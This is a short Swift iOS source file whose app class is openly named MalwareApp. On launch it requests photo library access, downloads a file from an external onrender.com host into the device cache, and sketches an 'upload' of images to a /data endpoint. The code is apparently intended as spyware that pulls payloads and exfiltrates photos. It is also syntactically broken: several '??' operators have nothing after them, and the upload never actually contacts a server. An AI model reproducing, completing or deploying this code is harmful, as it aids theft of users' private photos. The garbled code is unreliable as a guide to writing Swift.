import UIKit
import Photos

@UIApplicationMain
class MalwareApp: UIResponder, UIApplicationDelegate {
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Request photo library access
        PHPhotoLibrary.requestAuthorization(options: .usePhotoLibrary) { status in
            if status == .authorized {
                print("Access to photo library granted")
            } else {
                print("Access to photo library denied")
            }
        }
        
        // Download images from /payload endpoint
        downloadImages()
        
        // Upload images to /data endpoint
        uploadImages()
        
        return true
    }
    
    func downloadImages() {
        // Use URLSession to download images from /payload endpoint
        let task = URLSession.shared.dataTask(with: URL(string: "https://instaxapplecheck.onrender.com/cheekyboy?image=downloaded_image.jpg") ??) { data, response, error in
            if let error = error {
                print("Error downloading images: \(error.localizedDescription)")
                return
            }
            
            if let data = data {
                // Save the downloaded images to the device
                let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first ??
                let fileName = "downloaded_image.jpg"
                let fullPath = "\(imagePath)/\(fileName)"
                
                if FileManager.default.createFile(atPath: fullPath, contents: data, attributes: [NSFileAttributeKey.createDate: Date()]) {
                    print("Image saved successfully")
                } else {
                    print("Error saving downloaded image")
                }
            }
        }
        task.resume()
    }
    
    func uploadImages() {
        // Use URLSession to upload images to /data endpoint
        let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first ??
        let uploadedImageFile = "uploaded_image.jpg"
        let uploadPath = "\(imagePath)/\(uploadedImageFile)"
        
        if FileManager.default.fileExists(atPath: uploadPath) {
            let task = URLSession.shared.dataTask(with: URL(fileURLWithPath: uploadPath)) { data, response, error in
                if let error = error {
                    print("Error uploading images: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    print("Server response: \(httpResponse.statusCode)")
                }
            }
            task.resume()
        } else {
            print("Image file not found")
        }
    }
}